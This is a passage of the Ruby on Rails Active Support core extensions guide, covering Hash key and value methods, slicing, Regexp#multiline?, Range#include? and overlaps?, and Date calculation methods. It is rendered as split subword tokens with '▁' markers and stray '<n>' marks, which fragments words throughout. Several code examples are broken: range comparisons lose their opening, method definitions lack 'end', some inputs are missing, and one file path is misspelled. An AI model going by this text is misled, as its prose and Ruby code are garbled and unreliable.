▁# ▁=> ▁ { : a => { : b =>1 , ▁: c =>2} }
▁The ▁method ▁` deep _ merge !` ▁perform s ▁a ▁ deep ▁merge ▁in ▁place .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / deep _ merge . rb `.
▁### ▁D eep ▁ dup li cat ing
▁The ▁method ▁` Hash . deep _ dup ` ▁duplicate s ▁itself ▁and ▁all ▁keys ▁and ▁values < n > in side ▁ recursive ly ▁with ▁Active ▁Support ▁method ▁` Object # deep _ dup `.
▁It ▁works ▁like ▁` E n um er at or # each _ with _ object ` ▁with ▁sending ▁` deep _ dup ` ▁method ▁to ▁each ▁pair ▁inside .
▁hash ▁= ▁ { ▁a : ▁1, ▁b : ▁ { ▁c : ▁2, ▁d : ▁[ 3 , ▁4 ] ▁ } ▁ }
▁ dup ▁= ▁hash . deep _ dup
▁ dup [: b ] [: e ] ▁= ▁5
▁ dup [: b ] [: d ] ▁< < ▁5
▁hash [: b ] [: e ] ▁== ▁nil ▁# ▁=> ▁true
▁hash [: b ] [: d ] ▁== ▁[ 3 , ▁4 ] ▁# ▁=> ▁true
▁### ▁Work ing ▁with ▁ K e y s
▁#### ▁` except ` ▁and ▁` except !
▁The ▁method ▁` except ` ▁returns ▁a ▁hash ▁with ▁the ▁keys ▁in ▁the ▁argument ▁list ▁removed , ▁if ▁present :
▁ { a : ▁1, ▁b : ▁2 }. except (: a ) ▁# ▁=> ▁ { : b =>2}
▁If ▁the ▁receiver ▁respond s ▁to ▁` co n ve r t _ key `, ▁the ▁method ▁is ▁called ▁on ▁each ▁of ▁the ▁arguments .
▁This ▁allows ▁` except ` ▁to ▁ play ▁nice ▁with ▁hashes ▁with ▁in different ▁access ▁for ▁instance :
▁ { a : ▁1 }. with _ in different _ access . except (: a ) ▁# ▁=> ▁ { }
▁ { a : ▁1 }. with _ in different _ access . except (" a ") ▁# ▁=> ▁ { }
▁There ' s ▁also ▁the ▁ bang ▁variant ▁` except !` ▁that ▁remove s ▁keys ▁in ▁the ▁very ▁receiver .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / except . rb `.
▁#### ▁` transform _ keys ` ▁and ▁` transform _ keys !
▁The ▁method ▁` transform _ keys ` ▁accept s ▁a ▁block ▁and ▁returns ▁a ▁hash ▁that ▁has ▁applied ▁the ▁block ▁operations ▁to ▁each ▁of ▁the ▁keys ▁in ▁the ▁receiver :
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁a : ▁: a }. transform _ keys ▁ { ▁| key | ▁key . to _ s . up case ▁ }
▁# ▁=> ▁{" " ▁=> ▁nil , ▁" A " ▁=> ▁: a , ▁ "1" ▁=> ▁1 }
▁In ▁case ▁of ▁key ▁co ll is ion , ▁one ▁of ▁the ▁values ▁will ▁be ▁chose n .
▁The ▁chose n ▁value ▁may ▁not ▁always ▁be ▁the ▁same ▁given ▁the ▁same ▁hash :
▁{" a " ▁=> ▁1, ▁a : ▁2 }. transform _ keys ▁ { ▁| key | ▁key . to _ s . up case ▁ }
▁# ▁The ▁result ▁could ▁either ▁be
▁# ▁=> ▁{" A " =>2}
▁# ▁=> ▁{" A " =>1 }
▁This ▁method ▁may ▁be ▁useful ▁for ▁example ▁to ▁build ▁special ize d ▁ conversions .
▁For ▁instance ▁` stringify _ keys ` ▁and ▁` symbolize _ keys ` ▁use ▁` transform _ keys ` ▁to ▁perform ▁their ▁key ▁ conversions :
▁def ▁ stringify _ keys
▁ transform _ keys ▁ { ▁| key | ▁key . to _ s ▁ }
▁def ▁ symbolize _ keys
▁ transform _ keys ▁ { ▁| key | ▁key . to _ s y m ▁rescue ▁key ▁ }
▁There ' s ▁also ▁the ▁ bang ▁variant ▁` transform _ keys !` ▁that ▁applies ▁the ▁block ▁operations ▁to ▁keys ▁in ▁the ▁very ▁receiver .
▁Be side s ▁that , ▁one ▁can ▁use ▁` deep _ transform _ keys ` ▁and ▁` deep _ transform _ keys !` ▁to ▁perform ▁the ▁block ▁operation ▁on ▁all ▁the ▁keys ▁in ▁the ▁given ▁hash ▁and ▁all ▁the ▁hashes ▁nested ▁into ▁it .
▁An ▁example ▁of ▁the ▁result ▁is :
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁nested : ▁ { a : ▁3 , ▁5 ▁=> ▁5 } }. deep _ transform _ keys ▁ { ▁| key | ▁key . to _ s . up case ▁ }
▁# ▁=> ▁{" " => nil , ▁ "1" =>1 , ▁" N E ST E D " => {" A " => 3 , ▁" 5 " => 5 } }
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / keys . rb `.
▁#### ▁` stringify _ keys ` ▁and ▁` stringify _ keys !
▁The ▁method ▁` stringify _ keys ` ▁returns ▁a ▁hash ▁that ▁has ▁a ▁ stringified ▁version ▁of ▁the ▁keys ▁in ▁the ▁receiver .
▁It ▁does ▁so ▁by ▁sending ▁` to _ s ` ▁to ▁them :
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁a : ▁: a }. stringify _ keys
▁# ▁=> ▁{" " ▁=> ▁nil , ▁" a " ▁=> ▁: a , ▁ "1" ▁=> ▁1 }
▁{" a " ▁=> ▁1, ▁a : ▁2 }. stringify _ keys
▁# ▁=> ▁{" a " =>2}
▁# ▁=> ▁{" a " =>1 }
▁This ▁method ▁may ▁be ▁useful ▁for ▁example ▁to ▁easily ▁accept ▁both ▁symbols ▁and ▁strings ▁as ▁options .
▁For ▁instance ▁` ActionView :: Helpers :: For m Helper ` ▁defines :
▁def ▁to _ check _ box _ tag ( options ▁= ▁ { }, ▁check ed _ value ▁= ▁ "1" , ▁un check ed _ value ▁= ▁" 0 ")
▁options ▁= ▁options . stringify _ keys
▁options [ " type "] ▁= ▁" checkbox "
▁The ▁second ▁line ▁can ▁safe ly ▁access ▁the ▁" type " ▁key , ▁and ▁let ▁the ▁user ▁to ▁pass ▁either ▁`: type ` ▁or ▁" type ".
▁There ' s ▁also ▁the ▁ bang ▁variant ▁` stringify _ keys !` ▁that ▁string if ies ▁keys ▁in ▁the ▁very ▁receiver .
▁Be side s ▁that , ▁one ▁can ▁use ▁` deep _ stringify _ keys ` ▁and ▁` deep _ stringify _ keys !` ▁to ▁ stringify ▁all ▁the ▁keys ▁in ▁the ▁given ▁hash ▁and ▁all ▁the ▁hashes ▁nested ▁into ▁it .
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁nested : ▁ { a : ▁3 , ▁5 ▁=> ▁5 } }. deep _ stringify _ keys
▁# ▁=> ▁{" " => nil , ▁ "1" =>1 , ▁" nested " => {" a " => 3 , ▁" 5 " => 5 } }
▁#### ▁` symbolize _ keys ` ▁and ▁` symbolize _ keys !
▁The ▁method ▁` symbolize _ keys ` ▁returns ▁a ▁hash ▁that ▁has ▁a ▁ symbolize d ▁version ▁of ▁the ▁keys ▁in ▁the ▁receiver , ▁where ▁possible .
▁It ▁does ▁so ▁by ▁sending ▁` to _ s y m ` ▁to ▁them :
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁" a " ▁=> ▁" a " }. symbolize _ keys
▁# ▁=> ▁ { 1 =>1 , ▁nil => nil , ▁: a =>" a "}
▁WARNING . ▁Note ▁in ▁the ▁previous ▁example ▁only ▁one ▁key ▁was ▁ symbolize d .
▁{" a " ▁=> ▁1, ▁a : ▁2 }. symbolize _ keys
▁# ▁=> ▁ { : a =>2}
▁# ▁=> ▁ { : a =>1 }
▁For ▁instance ▁` ActionController :: U r l Re writer ` ▁defines
▁def ▁re write _ path ( options )
▁options ▁= ▁options . symbolize _ keys
▁options . update ( options [: params ] . symbolize _ keys ) ▁if ▁options [: params ]
▁The ▁second ▁line ▁can ▁safe ly ▁access ▁the ▁`: params ` ▁key , ▁and ▁let ▁the ▁user ▁to ▁pass ▁either ▁`: params ` ▁or ▁" params ".
▁There ' s ▁also ▁the ▁ bang ▁variant ▁` symbolize _ keys !` ▁that ▁ symbolize s ▁keys ▁in ▁the ▁very ▁receiver .
▁Be side s ▁that , ▁one ▁can ▁use ▁` deep _ symbolize _ keys ` ▁and ▁` deep _ symbolize _ keys !` ▁to ▁ symbolize ▁all ▁the ▁keys ▁in ▁the ▁given ▁hash ▁and ▁all ▁the ▁hashes ▁nested ▁into ▁it .
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁" nested " ▁=> ▁{" a " ▁=> ▁3 , ▁5 ▁=> ▁5 } }. deep _ symbolize _ keys
▁# ▁=> ▁ { nil => nil , ▁1 =>1 , ▁nested : { a : 3 , ▁5 => 5 } }
▁#### ▁` to _ options ` ▁and ▁` to _ options !
▁The ▁methods ▁` to _ options ` ▁and ▁` to _ options !` ▁are ▁respectively ▁alias es ▁of ▁` symbolize _ keys ` ▁and ▁` symbolize _ keys !` .
▁#### ▁` assert _ valid _ keys `
▁The ▁method ▁` assert _ valid _ keys ` ▁receive s ▁an ▁arbitrar y ▁number ▁of ▁arguments , ▁and ▁check s ▁whether ▁the ▁receiver ▁has ▁any ▁key ▁outside ▁that ▁ white ▁list .
▁If ▁it ▁does ▁` ArgumentError ` ▁is ▁raised .
▁ { a : ▁1 }. assert _ valid _ keys (: a ) ▁# ▁passes
▁ { a : ▁1 }. assert _ valid _ keys (" a ") ▁# ▁ ArgumentError
▁Active ▁Record ▁does ▁not ▁accept ▁ unknown ▁options ▁when ▁build ing ▁associations , ▁for ▁example .
▁It ▁implement s ▁that ▁control ▁via ▁` assert _ valid _ keys `.
▁### ▁Work ing ▁with ▁ V al ue s
▁#### ▁` transform _ value s ` ▁ && ▁` transform _ value s !`
▁The ▁method ▁` transform _ value s ` ▁accept s ▁a ▁block ▁and ▁returns ▁a ▁hash ▁that ▁has ▁applied ▁the ▁block ▁operations ▁to ▁each ▁of ▁the ▁values ▁in ▁the ▁receiver .
▁ { ▁nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁: x ▁=> ▁: a ▁ }. transform _ value s ▁ { ▁| value | ▁value . to _ s . up case ▁ }
▁# ▁=> ▁ { nil =>" ", ▁1 => "1" , ▁: x =>" A "}
▁There ' s ▁also ▁the ▁ bang ▁variant ▁` transform _ value s !` ▁that ▁applies ▁the ▁block ▁operations ▁to ▁values ▁in ▁the ▁very ▁receiver .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ text / hash / transform _ value s . rb `.
▁### ▁S li c ing
▁Ruby ▁has ▁built - in ▁support ▁for ▁tak ing ▁ s li ce s ▁out ▁of ▁strings ▁and ▁arrays .
▁Active ▁Support ▁extend s ▁ s li c ing ▁to ▁hashes :
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁3 }. s li ce (: a , ▁: c )
▁# ▁=> ▁ { : c => 3 , ▁: a =>1 }
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁3 }. s li ce (: b , ▁: X )
▁# ▁=> ▁ { : b =>2} ▁# ▁non - ex ist ing ▁keys ▁are ▁ignored
▁If ▁the ▁receiver ▁respond s ▁to ▁` co n ve r t _ key ` ▁keys ▁are ▁normal ize d :
▁ { a : ▁1, ▁b : ▁2 }. with _ in different _ access . s li ce (" a ")
▁NOTE . ▁S li c ing ▁may ▁come ▁in ▁hand y ▁for ▁sanit i z ing ▁option ▁hashes ▁with ▁a ▁ white ▁list ▁of ▁keys .
▁There ' s ▁also ▁` s li ce !` ▁which ▁in ▁addition ▁to ▁perform ▁a ▁ s li ce ▁in ▁place ▁returns ▁what ' s ▁removed :
▁hash ▁= ▁ { a : ▁1, ▁b : ▁2 }
▁rest ▁= ▁hash . s li ce ! (: a ) ▁# ▁=> ▁ { : b =>2}
▁hash ▁# ▁=> ▁ { : a =>1 }
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / s li ce . rb `.
▁### ▁ Extra c ting
▁The ▁method ▁` extract !` ▁remove s ▁and ▁returns ▁the ▁key / value ▁pair s ▁matching ▁the ▁given ▁keys .
▁rest ▁= ▁hash . extract ! (: a ) ▁# ▁=> ▁ { : a =>1 }
▁hash ▁# ▁=> ▁ { : b =>2}
▁The ▁method ▁` extract !` ▁returns ▁the ▁same ▁sub class ▁of ▁ Hash , ▁that ▁the ▁receiver ▁is .
▁hash ▁= ▁ { a : ▁1, ▁b : ▁2 }. with _ in different _ access
▁rest ▁= ▁hash . extract ! (: a ). class
▁# ▁=> ▁ ActiveSupport :: Hash With In different A cc es s
▁### ▁In different ▁Access
▁The ▁method ▁` with _ in different _ access ` ▁returns ▁an ▁` ActiveSupport :: Hash With In different A cc es s ` ▁out ▁of ▁its ▁receiver :
▁ { a : ▁1 }. with _ in different _ access [ " a "] ▁# ▁=> ▁1
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / in different _ access . rb `.
▁### ▁Co mpact ing
▁The ▁methods ▁` co mpact ` ▁and ▁` co mpact !` ▁return ▁a ▁ Hash ▁without ▁items ▁with ▁` nil ` ▁value .
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁nil }. co mpact ▁# ▁=> ▁ { a : ▁1, ▁b : ▁2 }
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / co mpact . rb `.
▁Extensions ▁to ▁` Regexp `
▁### ▁` multiline ?
▁The ▁method ▁` multiline ?` ▁say s ▁whether ▁a ▁regex p ▁has ▁the ▁` / m ` ▁flag ▁set , ▁that ▁is , ▁whether ▁the ▁do t ▁matches ▁new line s .
▁% r { . } m . multiline ?
▁ Regexp . new (' . ' ). multiline ?
▁ Regexp . new (' . ' , ▁ Regexp :: M U L T I L IN E ). multiline ?
▁Rails ▁uses ▁this ▁method ▁in ▁a ▁single ▁place , ▁also ▁in ▁the ▁routing ▁code .
▁Multi line ▁regex p s ▁are ▁d is allow ed ▁for ▁route ▁requirements ▁and ▁this ▁flag ▁e as es ▁enforc ing ▁that ▁constraint .
▁def ▁assign _ route _ options ( s eg ment s , ▁defaults , ▁requirements )
▁if ▁requirement . multiline ?
▁raise ▁ ArgumentError , ▁" Regexp ▁ multiline ▁option ▁not ▁allowed ▁in ▁routing ▁requirements : ▁# { require ment . inspect } "
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / regex p . rb `.
▁Extensions ▁to ▁` Range `
▁Active ▁Support ▁extend s ▁the ▁method ▁` Range # to _ s ` ▁so ▁that ▁it ▁understand s ▁an ▁optional ▁format ▁argument .
▁As ▁of ▁this ▁writing ▁the ▁only ▁supported ▁non - default ▁format ▁is ▁`: db ` :
▁# ▁=> ▁" 200 9 - 10 - 2 5 . . 200 9 - 10 - 2 6 "
▁# ▁=> ▁" BETWEEN ▁' 200 9 - 10 - 2 5 ' ▁ AND ▁' 200 9 - 10 - 2 6 ' "
▁As ▁the ▁example ▁ de p ic t s , ▁the ▁`: db ` ▁format ▁generates ▁a ▁` BETWEEN ` ▁SQL ▁clause .
▁That ▁is ▁used ▁by ▁Active ▁Record ▁in ▁its ▁support ▁for ▁range ▁values ▁in ▁conditions .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / range / conversions . rb `.
▁### ▁` include ?
▁The ▁methods ▁` Range # include ?` ▁and ▁` Range # = = = ` ▁say ▁whether ▁some ▁value ▁f all s ▁between ▁the ▁end s ▁of ▁a ▁given ▁instance :
▁( 2 . . 3 ). include ?( Math :: E ) ▁# ▁=> ▁true
▁Active ▁Support ▁extend s ▁these ▁methods ▁so ▁that ▁the ▁argument ▁may ▁be ▁another ▁range ▁in ▁turn .
▁In ▁that ▁case ▁we ▁test ▁whether ▁the ▁end s ▁of ▁the ▁argument ▁range ▁be long ▁to ▁the ▁receiver ▁themselves :
▁3 . . 7 ) ▁# ▁=> ▁true
▁0 . . 7 ) ▁# ▁=> ▁false
▁3 . . 11 ) ▁# ▁=> ▁false
▁3 . . 9 ) ▁# ▁=> ▁false
▁( 1 . . 10 ) ▁== = ▁( 3 . . 7 ) ▁# ▁=> ▁true
▁( 1 . . 10 ) ▁== = ▁( 0 . . 7 ) ▁# ▁=> ▁false
▁( 1 . . 10 ) ▁== = ▁( 3 . . 11 ) ▁# ▁=> ▁false
▁( 1 . . . 9 ) ▁== = ▁( 3 . . 9 ) ▁# ▁=> ▁false
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / range / include _ range . rb `.
▁### ▁` overlap s ?
▁The ▁method ▁` Range # overlap s ?` ▁say s ▁whether ▁any ▁two ▁given ▁range s ▁have ▁non - v o id ▁in ter section :
▁7 . . 11 ) ▁# ▁=> ▁true
▁0 . . 7 ) ▁# ▁=> ▁true
▁ 11 . . 27 ) ▁# ▁=> ▁false
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / range / overlap s . rb `.
▁Extensions ▁to ▁` Date `
▁### ▁C al c ul ation s
▁NOTE : ▁All ▁the ▁following ▁methods ▁are ▁defined ▁in ▁` active _ support / core _ ext / date / calculations . rb `.
▁INFO : ▁The ▁following ▁calculat ion ▁methods ▁have ▁edge ▁cases ▁in ▁Oct ob er ▁ 1582 , ▁since ▁days ▁5 . . 1 4 ▁just ▁do ▁not ▁exist .
▁This ▁guide ▁does ▁not ▁document ▁their ▁behavior ▁around ▁those ▁days ▁for ▁brevity , ▁but ▁it ▁is ▁enough ▁to ▁say ▁that ▁they ▁do ▁what ▁you ▁would ▁expect .
▁That ▁is , ▁` Date . new ( 1582 , ▁10 , ▁4 ). to m or row ` ▁returns ▁` Date . new ( 1582 , ▁10 , ▁ 15 )` ▁and ▁so ▁on .
▁P lease ▁check ▁` test / core _ ext / date _ ext _ test . rb ` ▁in ▁the ▁Active ▁Support ▁test ▁suite ▁for ▁expected ▁behavior .
▁#### ▁` Date . current `
▁Active ▁Support ▁defines ▁` Date . current ` ▁to ▁be ▁to day ▁in ▁the ▁current ▁time ▁zone .
▁That ' s ▁like ▁` Date . to day `, ▁except ▁that ▁it ▁honor s ▁the ▁user ▁time ▁zone , ▁if ▁defined .
▁It ▁also ▁defines ▁` Date . yesterday ` ▁and ▁` Date . to m or row `, ▁and ▁the ▁instance ▁predicate s ▁` past ?` , ▁` to day ?` , ▁and ▁` future ?` , ▁all ▁of ▁them ▁relative ▁to ▁` Date . current `.
▁When ▁making ▁Date ▁comparison s ▁using ▁methods ▁which ▁honor ▁the ▁user ▁time ▁zone , ▁make ▁sure ▁to ▁use ▁` Date . current ` ▁and ▁not ▁` Date . to day `.
▁There ▁are ▁cases ▁where ▁the ▁user ▁time ▁zone ▁m ight ▁be ▁in ▁the ▁future ▁compare d ▁to ▁the ▁system ▁time ▁zone , ▁which ▁` Date . to day ` ▁uses ▁by ▁default .
▁This ▁means ▁` Date . to day ` ▁may ▁equal ▁` Date . yesterday `.
▁#### ▁Name d ▁date s
▁#### # ▁` prev _ year `, ▁` next _ year `
▁In ▁Ruby ▁1.9 ▁` prev _ year ` ▁and ▁` next _ year ` ▁return ▁a ▁date ▁with ▁the ▁same ▁day / month ▁in ▁the ▁last ▁or ▁next ▁ year :
▁d ▁= ▁Date . new (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁d . prev _ year ▁# ▁=> ▁Fri , ▁ 08 ▁May ▁200 9
▁d . next _ year ▁# ▁=> ▁Sun , ▁ 08 ▁May ▁ 2011
▁If ▁date ▁is ▁the ▁29 th ▁of ▁Feb ru ary ▁of ▁a ▁ le ap ▁ year , ▁you ▁obtain ▁the ▁28 th :
▁d ▁= ▁Date . new ( 200 0, ▁2, ▁29 ) ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁d . prev _ year ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁ 19 99
▁d . next _ year ▁# ▁=> ▁We d , ▁28 ▁Feb ▁200 1
▁` prev _ year ` ▁is ▁alias ed ▁to ▁` last _ year `.
▁#### # ▁` prev _ month `, ▁` next _ month `
▁In ▁Ruby ▁1.9 ▁` prev _ month ` ▁and ▁` next _ month ` ▁return ▁the ▁date ▁with ▁the ▁same ▁day ▁in ▁the ▁last ▁or ▁next ▁ month :
▁d . prev _ month ▁# ▁=> ▁Thu , ▁ 08 ▁Apr ▁2010
▁d . next _ month ▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010
▁If ▁such ▁a ▁day ▁does ▁not ▁exist , ▁the ▁last ▁day ▁of ▁the ▁corresponding ▁ month ▁is ▁returned :
▁Date . new ( 200 0, ▁5 , ▁31). prev _ month ▁# ▁=> ▁Sun , ▁30 ▁Apr ▁2000
▁Date . new ( 200 0, ▁3 , ▁31). prev _ month ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁Date . new ( 200 0, ▁5 , ▁31). next _ month ▁# ▁=> ▁Fri , ▁30 ▁Jun ▁2000
▁Date . new ( 200 0, ▁1, ▁31). next _ month ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁` prev _ month ` ▁is ▁alias ed ▁to ▁` last _ month `.
▁#### # ▁` prev _ quarter `, ▁` next _ quarter `
▁S a me ▁as ▁` prev _ month ` ▁and ▁` next _ month `.
▁It ▁returns ▁the ▁date ▁with ▁the ▁same ▁day ▁in ▁the ▁previous ▁or ▁next ▁ quarter :
▁t ▁= ▁Time . local (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁t . prev _ quarter ▁# ▁=> ▁Mon , ▁ 08 ▁Feb ▁2010
▁t . next _ quarter ▁# ▁=> ▁Sun , ▁ 08 ▁A ug ▁2010
▁Time . local ( 200 0, ▁7 , ▁31). prev _ quarter ▁# ▁=> ▁Sun , ▁30 ▁Apr ▁2000
▁Time . local ( 200 0, ▁5 , ▁31). prev _ quarter ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁Time . local ( 200 0, ▁10 , ▁31). prev _ quarter ▁# ▁=> ▁Mon , ▁30 ▁Oct ▁2000
▁Time . local ( 200 0, ▁ 11 , ▁31). next _ quarter ▁# ▁=> ▁We d , ▁28 ▁Feb ▁200 1
▁` prev _ quarter ` ▁is ▁alias ed ▁to ▁` last _ quarter `.
▁#### # ▁` beginning _ of _ week `, ▁` end _ of _ week `
▁The ▁methods ▁` beginning _ of _ week ` ▁and ▁` end _ of _ week ` ▁return ▁the ▁date s ▁for ▁the < n > beginning ▁and ▁end ▁of ▁the ▁ week , ▁respectively .
▁We e k s ▁are ▁assume d ▁to ▁start ▁on < n > M on day , ▁but ▁that ▁can ▁be ▁changed ▁passing ▁an ▁argument , ▁setting ▁thread ▁local < n >` Date . beginning _ of _ week ` ▁or ▁` config . beginning _ of _ week `.
▁d ▁= ▁Date . new (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁d . beginning _ of _ week ▁# ▁=> ▁Mon , ▁0 3 ▁May ▁2010
▁d . beginning _ of _ week (: sunday ) ▁# ▁=> ▁Sun , ▁ 02 ▁May ▁2010
▁d . end _ of _ week ▁# ▁=> ▁Sun , ▁09 ▁May ▁2010
▁d . end _ of _ week (: sunday ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁` beginning _ of _ week ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ week ` ▁and ▁` end _ of _ week ` ▁is ▁alias ed ▁to ▁` at _ end _ of _ week `.
▁#### # ▁` monday `, ▁` sunday `
▁The ▁methods ▁` monday ` ▁and ▁` sunday ` ▁return ▁the ▁date s ▁for ▁the ▁previous ▁Mon day ▁and < n > next ▁Sun day , ▁respectively .
▁d . monday ▁# ▁=> ▁Mon , ▁0 3 ▁May ▁2010
▁d . sunday ▁# ▁=> ▁Sun , ▁09 ▁May ▁2010
▁d ▁= ▁Date . new (201 2 , ▁ 9 , ▁10 ) ▁# ▁=> ▁Mon , ▁10 ▁Sep ▁20 12
▁d . monday ▁# ▁=> ▁Mon , ▁10 ▁Sep ▁20 12
▁d ▁= ▁Date . new (201 2 , ▁ 9 , ▁ 16 ) ▁# ▁=> ▁Sun , ▁ 16 ▁Sep ▁20 12
▁d . sunday ▁# ▁=> ▁Sun , ▁ 16 ▁Sep ▁20 12
▁#### # ▁` prev _ week `, ▁` next _ week `
▁The ▁method ▁` next _ week ` ▁receive s ▁a ▁symbol ▁with ▁a ▁day ▁name ▁in ▁English ▁( default ▁is ▁the ▁thread ▁local ▁` Date . beginning _ of _ week `, ▁or ▁` config . beginning _ of _ week `, ▁or ▁`: monday `) ▁and ▁it ▁returns ▁the ▁date ▁corresponding ▁to ▁that ▁day .
▁d ▁= ▁Date . new (201 0, ▁5 , ▁ 9 ) ▁# ▁=> ▁Sun , ▁09 ▁May ▁2010
▁d . next _ week ▁# ▁=> ▁Mon , ▁10 ▁May ▁2010
▁d . next _ week (: s at ur day ) ▁# ▁=> ▁S at , ▁ 15 ▁May ▁2010
▁The ▁method ▁` prev _ week ` ▁is ▁analogous :
▁d . prev _ week ▁# ▁=> ▁Mon , ▁2 6 ▁Apr ▁2010
▁d . prev _ week (: s at ur day ) ▁# ▁=> ▁S at , ▁01 ▁May ▁2010
▁d . prev _ week (: f r i day ) ▁# ▁=> ▁Fri , ▁30 ▁Apr ▁2010
▁` prev _ week ` ▁is ▁alias ed ▁to ▁` last _ week `.
▁Bo th ▁` next _ week ` ▁and ▁` prev _ week ` ▁work ▁as ▁expected ▁when ▁` Date . beginning _ of _ week ` ▁or ▁` config . beginning _ of _ week ` ▁are ▁set .
▁#### # ▁` beginning _ of _ month `, ▁` end _ of _ month `
▁The ▁methods ▁` beginning _ of _ month ` ▁and ▁` end _ of _ month ` ▁return ▁the ▁date s ▁for ▁the ▁beginning ▁and ▁end ▁of ▁the ▁ month :
▁d . beginning _ of _ month ▁# ▁=> ▁S at , ▁01 ▁May ▁2010
▁d . end _ of _ month ▁# ▁=> ▁Mon , ▁31 ▁May ▁2010
▁` beginning _ of _ month ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ month `, ▁and ▁` end _ of _ month ` ▁is ▁alias ed ▁to ▁` at _ end _ of _ month `.
▁#### # ▁` beginning _ of _ quarter `, ▁` end _ of _ quarter `
▁The ▁methods ▁` beginning _ of _ quarter ` ▁and ▁` end _ of _ quarter ` ▁return ▁the ▁date s ▁for ▁the ▁beginning ▁and ▁end ▁of ▁the ▁ quarter ▁of ▁the ▁receiver ' s ▁c al end ar ▁ year :
▁d . beginning _ of _ quarter ▁# ▁=> ▁Thu , ▁01 ▁Apr ▁2010
▁d . end _ of _ quarter ▁# ▁=> ▁We d , ▁30 ▁Jun ▁2010
▁` beginning _ of _ quarter ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ quarter `, ▁and ▁` end _ of _ quarter ` ▁is ▁alias ed ▁to ▁` at _ end _ of _ quarter `.
▁#### # ▁` beginning _ of _ year `, ▁` end _ of _ year `
▁The ▁methods ▁` beginning _ of _ year ` ▁and ▁` end _ of _ year ` ▁return ▁the ▁date s ▁for ▁the ▁beginning ▁and ▁end ▁of ▁the ▁ year :
▁d . beginning _ of _ year ▁# ▁=> ▁Fri , ▁01 ▁Jan ▁2010
▁d . end _ of _ year ▁# ▁=> ▁Fri , ▁31 ▁De c ▁2010
▁` beginning _ of _ year ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ year `, ▁and ▁` end _ of _ year ` ▁is ▁alias ed ▁to ▁` at _ end _ of _ year `.
▁#### ▁Other ▁Date ▁Co m put ation s
▁#### # ▁` years _ ago `, ▁` years _ since `
▁The ▁method ▁` years _ ago ` ▁receive s ▁a ▁number ▁of ▁ years ▁and ▁returns ▁the ▁same ▁date ▁those ▁many ▁ years ▁ ago :
▁date ▁= ▁Date . new (201 0, ▁6 , ▁7 )
▁date . years _ ago (10) ▁# ▁=> ▁We d , ▁ 07 ▁Jun ▁2000
▁` years _ since ` ▁move s ▁forward ▁in ▁time :
▁date . years _ since (10) ▁# ▁=> ▁Sun , ▁ 07 ▁Jun ▁20 20
▁Date . new (201 2 , ▁2, ▁29 ). years _ ago (3) ▁# ▁=> ▁S at , ▁28 ▁Feb ▁200 9
▁Date . new (201 2 , ▁2, ▁29 ). years _ since (3) ▁# ▁=> ▁S at , ▁28 ▁Feb ▁20 15
▁#### # ▁` months _ ago `, ▁` months _ since `
▁The ▁methods ▁` months _ ago ` ▁and ▁` months _ since ` ▁work ▁analogous ly ▁for ▁ months :
▁Date . new (201 0, ▁4 , ▁30 ). months _ ago (2) ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010
▁Date . new (201 0, ▁4 , ▁30 ). months _ since (2) ▁# ▁=> ▁We d , ▁30 ▁Jun ▁2010
▁Date . new (201 0, ▁4 , ▁30 ). months _ ago (2) ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010
▁Date . new ( 200 9 , ▁ 12 , ▁31). months _ since (2) ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010
▁#### # ▁` week s _ ago `
▁The ▁method ▁` week s _ ago ` ▁works ▁analogous ly ▁for ▁ week s :
▁Date . new (201 0, ▁5 , ▁24 ). week s _ ago (1) ▁# ▁=> ▁Mon , ▁ 17 ▁May ▁2010
▁Date . new (201 0, ▁5 , ▁24 ). week s _ ago (2) ▁# ▁=> ▁Mon , ▁10 ▁May ▁2010
▁#### # ▁` advance `
▁The ▁most ▁generic ▁way ▁to ▁jump ▁to ▁other ▁days ▁is ▁` advance `.
▁This ▁method ▁receive s ▁a ▁hash ▁with ▁keys ▁`: years `, ▁`: months `, ▁`: week s `, ▁`: day s `, ▁and ▁returns ▁a ▁date ▁advanced ▁as ▁much ▁as ▁the ▁present ▁keys ▁indicate :
▁date ▁= ▁Date . new (201 0, ▁6 , ▁6 )
▁date . advance ( years : ▁1, ▁ week s : ▁2 ) ▁# ▁=> ▁Mon , ▁20 ▁Jun ▁ 2011
